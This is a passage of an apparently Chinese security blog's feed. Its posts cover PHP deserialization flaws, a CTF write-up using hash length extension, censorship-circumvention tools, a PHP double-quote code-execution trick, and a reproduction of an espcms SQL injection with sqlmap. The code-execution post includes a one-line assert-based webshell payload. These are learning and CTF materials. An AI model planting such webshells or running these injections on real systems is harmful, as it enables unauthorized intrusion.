    <link href="https://www.0x002.com/2018/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
    <id>https://www.0x002.com/2018/PHP反序列漏洞的简单学习/</id>
    <published>2018-10-08T02:52:15.000Z</published>
    <updated>2019-06-17T16:16:12.161Z</updated>
    
    <content type="html"><![CDATA[<p>在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。<br><a id="more"></a></p><h1 id="PHP序列化与反序列化"><a href="#PHP序列化与反序列化" class="headerlink" title="PHP序列化与反序列化"></a>PHP序列化与反序列化</h1><p>谈到PHP序列化与反序列化<br>那么必须涉及到两个函数<code>serialize()</code>与<code>unserialize()</code><br>前者是将一个对象进行序列化后者是其反过程</p><h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h2><p>先来看看此函数的解释<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/10/28/5bd4934800039.png"><br>函数返回的是一串字符串，可以对如数组和对象进行序列化处理<br>下面给出两个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php &#x2F;&#x2F;对数组进行序列化</span><br><span class="line">$a &#x3D; array(&#39;a&#39; &#x3D;&gt; &#39;Apple&#39; ,&#39;b&#39; &#x3D;&gt; &#39;banana&#39; , &#39;c&#39; &#x3D;&gt; &#39;Coconut&#39;);</span><br><span class="line">&#x2F;&#x2F;序列化数组</span><br><span class="line">$s &#x3D; serialize($a);</span><br><span class="line">echo $s;</span><br><span class="line">&#x2F;&#x2F;输出结果：a:3:&#123;s:1:&quot;a&quot;;s:5:&quot;Apple&quot;;s:1:&quot;b&quot;;s:6:&quot;banana&quot;;s:1:&quot;c&quot;;s:7:&quot;Coconut&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class name1 &#123;</span><br><span class="line">    var $test1;</span><br><span class="line">    var $test2;</span><br><span class="line">&#125;</span><br><span class="line">$test3 &#x3D; new name1;</span><br><span class="line">$test3-&gt;test1 &#x3D; &#39;hack &#39;;</span><br><span class="line">$test3-&gt;test2 &#x3D; &#39;fun&#39;;</span><br><span class="line">echo serialize($test3); </span><br><span class="line">&#x2F;&#x2F;输出结果：O:5:&quot;name1&quot;:2:&#123;s:5:&quot;test1&quot;;s:5:&quot;hack &quot;;s:5:&quot;test2&quot;;s:3:&quot;fun&quot;;&#125;</span><br></pre></td></tr></table></figure><br>对于序列化后得到的字符串解释如图<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/10/28/5bd496e29a917.png"></p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h2><p>将已序列化的字符串进行反序列，即恢复序列化前<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class name1 &#123;</span><br><span class="line">    var $test1;</span><br><span class="line">    var $test2;</span><br><span class="line">&#125;</span><br><span class="line">$str &#x3D; &#39;O:5:&quot;name1&quot;:2:&#123;s:5:&quot;test1&quot;;s:5:&quot;hack &quot;;s:5:&quot;test2&quot;;s:3:&quot;fun&quot;;&#125;&#39;;</span><br><span class="line">$ser &#x3D; unserialize($str);</span><br><span class="line">print_r($ser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/10/28/5bd4985a10303.png"></p><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>看似安全的序列化其实存在漏洞，而且一旦能利用就一般危害不小，在代码审计中我们需要格外注意此类型漏洞。<br>序列化漏洞常见的魔法函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">construct():当一个类被创建时自动调用</span><br><span class="line">destruct():当一个类被销毁时自动调用</span><br><span class="line">invoke():当把一个类当作函数使用时自动调用</span><br><span class="line">tostring():当把一个类当作字符串使用时自动调用</span><br><span class="line">wakeup():当调用unserialize()函数时自动调用</span><br><span class="line">sleep():当调用serialize()函数时自动调用</span><br><span class="line">__call():当要调用的方法不存在或权限不足时自动调用</span><br></pre></td></tr></table></figure><hr><p>简单测试如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class chybeta&#123;</span><br><span class="line">var $test &#x3D; &#39;123&#39;;</span><br><span class="line">function __wakeup()&#123;</span><br><span class="line">echo &quot;__wakeup&quot;;</span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">function __construct()&#123;</span><br><span class="line">echo &quot;__construct&quot;;</span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">function __destruct()&#123;</span><br><span class="line">echo &quot;__destruct&quot;;</span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class2 &#x3D; &#39;O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;&#39;;</span><br><span class="line">print_r($class2);</span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">$class2_unser &#x3D; unserialize($class2);</span><br><span class="line">print_r($class2_unser);</span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/10/28/5bd49a2003e1e.jpg"><br>由前可以看到，unserialize()后会导致<strong>wakeup() 或</strong>destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在<strong>wakeup() 或</strong>destruct()中，从而当我们控制序列化字符串时可以去直接触发它们。(这里因为懒直接照搬了某大佬的原文）</p><h3 id="绕过魔法函数"><a href="#绕过魔法函数" class="headerlink" title="绕过魔法函数"></a>绕过魔法函数</h3><p><strong>魔法函数sleep() 和 wakeup()<br>php文档中定义__wakeup():<br>unserialize() 执行时会检查是否存在一个 wakeup() 方法。如果存在，则会先调用 wakeup 方法，预先准备对象需要的资源。wakeup()经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。sleep()则相反，是用在序列化一个对象时被调用.</strong><br>正常情况下的反序列化来漏洞如下图：<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/09/06/5b90f7f9ae0d0.jpg"><br>析构方法和<strong>wakeup都能够执行<br>如果我们把传入的序列化字符串的属性个数更改成大于1的任何数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;hpdoger&quot;:2:&#123;s:1:&quot;a&quot;;s:6:&quot;u know&quot;;&#125;</span><br></pre></td></tr></table></figure><br>得到的结果如图，</strong>wakeup没有被执行，但是执行了析构函数</p><hr><h2 id="反序列化漏洞实战"><a href="#反序列化漏洞实战" class="headerlink" title="反序列化漏洞实战"></a>反序列化漏洞实战</h2><ul><li>南邮CTF<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class just4fun &#123; &#x2F;&#x2F;定义了一个类</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#39;pass&#39;])) &#123;</span><br><span class="line">    $pass &#x3D; $_GET[&#39;pass&#39;];</span><br><span class="line"></span><br><span class="line">    if(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $pass&#x3D;stripslashes($pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $o &#x3D; unserialize($pass); &#x2F;&#x2F;进行反序列化处理</span><br><span class="line"></span><br><span class="line">    if ($o) &#123;</span><br><span class="line">        $o-&gt;secret &#x3D; &quot;*&quot;; &#x2F;&#x2F;这里不知道*代表的是啥</span><br><span class="line">        if ($o-&gt;secret &#x3D;&#x3D;&#x3D; $o-&gt;enter) &#x2F;&#x2F;要求$o中的两个属性值相同</span><br><span class="line">            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;</span><br><span class="line">        else </span><br><span class="line">            echo &quot;Oh no... You can&#39;t fool me&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else echo &quot;are you trolling?&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>由于我们不知道<code>*</code>代表的是什么，故我们需要用指针来直接使两属性相等。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line">$o &#x3D; new just4fun;</span><br><span class="line">$o-&gt;enter &#x3D; &amp;$o-&gt;secret; &#x2F;&#x2F;这里的a&#x3D;&amp;b 即代表将b的指针赋值给a 无论b的值怎么变 a始终等于b</span><br><span class="line">echo serialize($o);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>本地运行即可得到序列化字符串<br><code>O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}</code><br>然后将此作为pass参数GET发送即可获得flag</li></ul>]]></content>
    
    <summary type="html">
    
      简单了解PHP反序列漏洞的形成
    
    </summary>
    
      <category term="原创栏目" scheme="https://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="PHP代码审计" scheme="https://www.0x002.com/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CTF实验吧让我进去writeup</title>
    <link href="https://www.0x002.com/2018/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup/"/>
    <id>https://www.0x002.com/2018/CTF实验吧让我进去writeup/</id>
    <published>2018-09-08T04:48:02.000Z</published>
    <updated>2019-06-17T16:18:47.125Z</updated>
    
    <content type="html"><![CDATA[<h1 id="初探题目"><a href="#初探题目" class="headerlink" title="初探题目"></a>初探题目</h1><a id="more"></a><p><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/10/23/5bcf2b29d3962.png"><br>两个表单，我们用burp抓包试试<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/10/23/5bcf2f8d4e0ca.png"><br>这时候我们发现Cookie值里有个很奇怪的值是source，这个单词有起源的意思，我们就可以猜测这个是判断权限的依据，让我们来修改其值为1，发送得到如下显示：<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/10/23/5bcf3112ab7be.png"></p><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>发现爆出了源代码，让我们来审计一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$flag &#x3D; &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;</span><br><span class="line">$secret &#x3D; &quot;XXXXXXXXXXXXXXX&quot;; &#x2F;&#x2F; This secret is 15 characters long for security!</span><br><span class="line"></span><br><span class="line">$username &#x3D; $_POST[&quot;username&quot;];</span><br><span class="line">$password &#x3D; $_POST[&quot;password&quot;];</span><br><span class="line"></span><br><span class="line">if (!empty($_COOKIE[&quot;getmein&quot;])) &#123;</span><br><span class="line">    if (urldecode($username) &#x3D;&#x3D;&#x3D; &quot;admin&quot; &amp;&amp; urldecode($password) !&#x3D; &quot;admin&quot;) &#123;</span><br><span class="line">        if ($COOKIE[&quot;getmein&quot;] &#x3D;&#x3D;&#x3D; md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">            die (&quot;The flag is &quot;. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        die (&quot;You are not an admin! LEAVE.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line">if (empty($_COOKIE[&quot;source&quot;])) &#123;</span><br><span class="line">    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if ($_COOKIE[&quot;source&quot;] !&#x3D; 0) &#123;</span><br><span class="line">        echo &quot;&quot;; &#x2F;&#x2F; This source code is outputted here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们如果需要获得flag，需要满足一下条件：<br>1.Cookie中getmein的值不能为空<br>2.username必须为admin和password不能为admin<br>3.Cookie中的getmein必须等于<code>md5($secret.urldecode($username.$password))</code><br>满足这三个条件才可获得flag，可是我们无法得知$secret的值为多少<br><code>setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));</code><br>发现下面有行代码是这样写的，将输出的<code>md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;))</code>作为cookie输出，结合前面的数据包我们可以知道输出的值为<code>571580b26c65f306376d4f64e53cb5c7</code> 可是这串md5是由$secret+’adminadmin’转md5而得到的，如果我们在password输入admin将不满足前面所需的三个条件</p><h1 id="死局转生"><a href="#死局转生" class="headerlink" title="死局转生"></a>死局转生</h1><p>我们知道常见的md5是16位的，而这里的md5正是16位，我们的$secret是十五位的,加上’adminadmin’就变成25位了，很明显这里的md5肯定会出现重复，所以我们可以哈希长度拓展攻击绕过这个死局<br>这里附两个讲述具体原理的链接:<br><a href="http://www.freebuf.com/articles/web/69264.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/69264.html</a> <a href="https://www.cnblogs.com/p00mj/p/6288337.html" target="_blank" rel="noopener">https://www.cnblogs.com/p00mj/p/6288337.html</a></p><p>在Kali下用hashpump操作<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="http://image.mamicode.com/info/201810/20181007123528335098.png"><br>最好我们构造数据包，把生成的数据发送即可获得flag<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="http://image.mamicode.com/info/201810/20181007123529050946.png"></p>]]></content>
    
    <summary type="html">
    
      WP
    
    </summary>
    
      <category term="技术文章" scheme="https://www.0x002.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="CTF" scheme="https://www.0x002.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>个人总结的一些科学上网的方法</title>
    <link href="https://www.0x002.com/2018/%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>https://www.0x002.com/2018/个人总结的一些科学上网的方法/</id>
    <published>2018-07-27T15:00:21.000Z</published>
    <updated>2019-06-17T16:00:02.813Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、VPN大法"><a href="#一、VPN大法" class="headerlink" title="一、VPN大法:"></a>一、VPN大法:</h2><p><strong>vpn大法可谓是最常见的招式，但目前随着天朝禁止的程度逐渐加大，许多VPN已经无法免费的使用，但是收费的VPN使用起来确实不错，主要是用来玩游戏。</strong></p><p>目前免费的VPN：<a href="http://my.0ff0.net/" target="_blank" rel="noopener">一小时VPN账号</a>     <a href="https://www.imfreevpnn.com/" target="_blank" rel="noopener">Free VPN 免费24小时</a></p><h2 id="二、SS大法："><a href="#二、SS大法：" class="headerlink" title="二、SS大法："></a>二、SS大法：</h2><a id="more"></a><p><strong>SS大法全称为ShadowSocks，也叫影梭大法，ShadowSocks 是由<a href="https://github.com/clowwindy/shadowsocks" target="_blank" rel="noopener">@clowwindy</a>所开发的一个开源 Socks5 代理，主要是用来穿透防火墙的限制来达到科学上网的目的。</strong></p><p>目前市面上免费的SS有很多，这里就列举两个：<a href="https://www.lets-ss.com/" target="_blank" rel="noopener">Let’s SS</a>  <a href="http://freess.cx/" target="_blank" rel="noopener">Free SS</a></p><h2 id="三、SSR大法："><a href="#三、SSR大法：" class="headerlink" title="三、SSR大法："></a>三、SSR大法：</h2><p>SSR全称shadowsocks-R。SSR作者声称SS不够隐匿，容易被防火墙检测到，SSR在改进了混淆和协议，更难被防火墙检测到。简单地说，SSR是SS的改进版。<br>使用方法与SS类似，这里不是在赘述。</p><h2 id="四、V2大法："><a href="#四、V2大法：" class="headerlink" title="四、V2大法："></a>四、V2大法：</h2><p>继vpn,ss,ssr之后又一个好用的科学上网工具，用法类似ss与ssr<br>使用方法具体请百度。</p><h2 id="五、镜像大法："><a href="#五、镜像大法：" class="headerlink" title="五、镜像大法："></a>五、镜像大法：</h2><p><strong>镜像大法，顾名思义就是通过仿制一个被墙的网站，通过浏览这个镜像站来达到翻墙的作用（实际上并没有翻墙）。</strong></p><p>当然镜像也不可能是把他整个网站都模仿下载。操作原理可简单认为：通过一个可以翻墙的服务器搭建一个镜像站，当你访问镜像站的时候，服务器会想被镜像站发送相同的数据包并返回到你的浏览器上。</p><p>目前可用的镜像站也有很多，在这里就给大家列举两个： <a href="http://ac.scmor.com/" target="_blank" rel="noopener">谷歌镜像导航</a>  <a href="http://coderschool.cn/1853.html" target="_blank" rel="noopener">镜像站收集项目</a></p><h2 id="六、Host大法："><a href="#六、Host大法：" class="headerlink" title="六、Host大法："></a>六、Host大法：</h2><p><strong>Host大法即修改本机Host，使域名直接被定向到其真实IP，穿透了GWF的拦截，达到翻墙的目的</strong></p><p>最新穿墙Host： <a href="http://coderschool.cn/2354.html" target="_blank" rel="noopener">最新Host</a></p><h2 id="七、DNS大法："><a href="#七、DNS大法：" class="headerlink" title="七、DNS大法："></a>七、DNS大法：</h2><p><strong>DNS大法即修改本机DNS来达到翻墙的目的，有些DNS是可以翻墙的，使用他的DNS就可以达到穿墙的目的。</strong></p><p>穿墙的DNS有：<a href="http://coderschool.cn/2249.html" target="_blank" rel="noopener">DNS</a></p><h2 id="八、小白翻墙终极大招之Tor大法："><a href="#八、小白翻墙终极大招之Tor大法：" class="headerlink" title="八、小白翻墙终极大招之Tor大法："></a>八、小白翻墙终极大招之Tor大法：</h2><p><strong>Tor大法，即通过Tor浏览器来达到翻墙的目的，此大法会经过三重代理来达到科学上网的目的，不过速度会比较慢一些，正常的网页浏览还可以做到，如果要是想用来看视频什么的就算了，此方法永久免费。虽然网上有一些什么误入暗网最后不得好死等此类新闻，但大多数都是危言耸听，暗网这种东西，只要你不去刻意的了解，一般人都不会接触到的。</strong></p><p>附Tor官网下载： <a href="http://www.theonionrouter.com/download/download-easy.html.en" target="_blank" rel="noopener">Tor下载</a></p>]]></content>
    
    <summary type="html">
    
      总结常见科学上网的方法
    
    </summary>
    
      <category term="原创栏目" scheme="https://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="奇淫技巧" scheme="https://www.0x002.com/tags/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/"/>
    
      <category term="Google" scheme="https://www.0x002.com/tags/Google/"/>
    
      <category term="翻墙大法" scheme="https://www.0x002.com/tags/%E7%BF%BB%E5%A2%99%E5%A4%A7%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>PHP中双引号引起的命令执行漏洞</title>
    <link href="https://www.0x002.com/2018/PHP%E4%B8%AD%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%BC%95%E8%B5%B7%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.0x002.com/2018/PHP中双引号引起的命令执行漏洞/</id>
    <published>2018-07-11T15:15:51.000Z</published>
    <updated>2019-06-17T16:15:14.786Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>在PHP语言中，单引号和双引号都可以表示一个字符串，但是对于双引号来说，可能会对引号内的内容进行二次解释，这就可能会出现安全问题。</strong></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>举个简单例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; 1;</span><br><span class="line">$b &#x3D; 2;</span><br><span class="line">echo &#39;$a$b&#39;;&#x2F;&#x2F;输出结果为$a$b</span><br><span class="line">echo &quot;$a$b&quot;;&#x2F;&#x2F;输出结果为12</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>可以看到这两个输出的结果并不相同。<br><a id="more"></a><br>在双引号中倘若有${}出现，那么{}内的内容将被当做代码块来执行。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/11/5b4621bf02bfa.png"><br>可以看到成功执行了phpinfo()</p><hr><p>试想一下，倘若在一个cms的后台，可以修改数据库的配置文件，且配置文件中的值用双引号包括，我们虽然也可以直接闭合代码达到getshell的后果，但是如果cms对传递的参数进行了addlashes()处理的话，我们就无法去闭合代码了，但这时我们可以传入${命令}就可以达到getshell的目的。</p><hr><p>现在，让我们来修改一下代码，让我们不只能输出phpinfo<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &quot;$&#123;@assert($_POST[a])&#125;&quot;;?&gt; &#x2F;&#x2F;@是用来防止输出错误信息的</span><br></pre></td></tr></table></figure><br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/11/5b4624108fe85.png"><br>菜刀成功连接</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文简单记录了双引号可能会引发的代码执行的情况<br>对于这种漏洞的防御，一定要明确单引号与双引号的区别所在，不要简单认为两者是互相可以替代的，在平时的代码书写中能只用单引号一定不要用双引号，毕竟单引号的解释时间也比双引号少得多，代码运行相对更快。</p>]]></content>
    
    <summary type="html">
    
      简单学习PHP中由双引号引起的命令执行漏洞。
    
    </summary>
    
      <category term="原创栏目" scheme="https://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="代码审计" scheme="https://www.0x002.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>读书笔记之CMS漏洞复现集合</title>
    <link href="https://www.0x002.com/2018/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8Bespcms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.0x002.com/2018/读书笔记之espcms漏洞复现/</id>
    <published>2018-07-10T12:41:33.000Z</published>
    <updated>2019-06-17T16:05:18.866Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>最近在看法师的代码审计企业级代码安全架构一书，打算对书中所列出的cms漏洞进行复现，无技术含量。</strong></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><blockquote><p>1.phpstudy环境整合包<br>2.各种cms安装包<br>3.《代码审计企业级代码安全架构》<br>4.Seay源代码审计系统</p></blockquote><h3 id="复现一之espcms注入漏洞"><a href="#复现一之espcms注入漏洞" class="headerlink" title="复现一之espcms注入漏洞"></a>复现一之espcms注入漏洞</h3><a id="more"></a><p>漏洞文件位置：espcms\adminsoft\control\citylist.php<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/10/5b44ac7267bba.png"><br>可以看到这里有一个sql请求，并且请求中包含着变量$parentid。<br>并且$parentid的赋值句子为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$parentid &#x3D; $this-&gt;fun-&gt;accept(&#39;parentid&#39;, &#39;R&#39;)</span><br></pre></td></tr></table></figure><br>这里引用对象进行赋值<br>我们查找accept这个自定义函数，看看是否有可能会有sql注入。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/10/5b44ae0884788.png"><br>可以看出这个函数是_用来通过<strong>$_POST、$_GET、$_COOKIE</strong> 三种方法来接收数据并保存为数组变量$var<br>最后通过一个daddslashes()函数对数据进行单引号等字符的过滤<br>但是我们前面所提到的sql语句中并不需要我们去闭合单引号，那么这句造成了一个sql注入漏洞<br>我们来找一下那些文件实例化了这个类<br>这个类名叫important，我们直接进行全局搜索<br>可以看到在adminsoft\index.php文件实例化了该类<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/10/5b44b198bed0a.png"><br>Tips:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$control &#x3D; new important();&#x2F;&#x2F;实例化important类</span><br><span class="line">$action &#x3D; &#39;on&#39; . $action;&#x2F;&#x2F;&#39;变量赋值&#39;</span><br><span class="line">if (method_exists($control, $action)) &#123;&#x2F;&#x2F;检测方法是否此名字</span><br><span class="line">$control-&gt;$action();&#x2F;&#x2F;如果存在则使用important类中的方法</span><br></pre></td></tr></table></figure><br>成功注入<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/10/5b44b66dd1b38.png"><br>用sqlmap测试一下<br>因为该漏洞需要登录，即需要cookie验证，我们用burpsuite抓下数据包，并保存到sqlmap目录下的1.txt里，然后再用sqlmap，输入命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r 1.txt</span><br></pre></td></tr></table></figure><br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2018/07/10/5b44be1a1629f.png"></p><h4 id="总结"><a href="#总结" class="headerlink" 